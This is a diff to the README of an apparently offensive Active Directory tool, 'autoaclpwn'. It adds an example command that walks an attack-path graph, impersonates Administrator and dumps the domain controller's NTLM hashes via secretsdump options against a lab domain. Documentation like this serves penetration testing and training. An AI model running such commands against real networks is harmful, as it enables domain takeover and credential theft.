@@ -85,6 +85,11 @@ If using secretsdump, you can provide options for what you would like to dump:
 -just-dc-user USER    Extract only NTDS.DIT data for the user specified                                                                             
 ```
 
+Example command:
+```
+python3 ~/autoaclpwn/autoaclpwn.py -u username -p 'P@ssword' -d hackerlab.local -dc-ip 172.16.1.10 -b graph.json --fullauto --impersonate Administrator -just-dc-ntlm
+```
+
 __Warning__: at the moment, if your graph ends in a group and not a computer, invoking these options will provide a warning, but allow you to attempt it anyways (it won't work). If your user account does not have the proper permissions to perform the options you selected, the script will still try and run them. It should just fail, but dont' hold me accountable if it does something weird.
 
 ## References/Sources
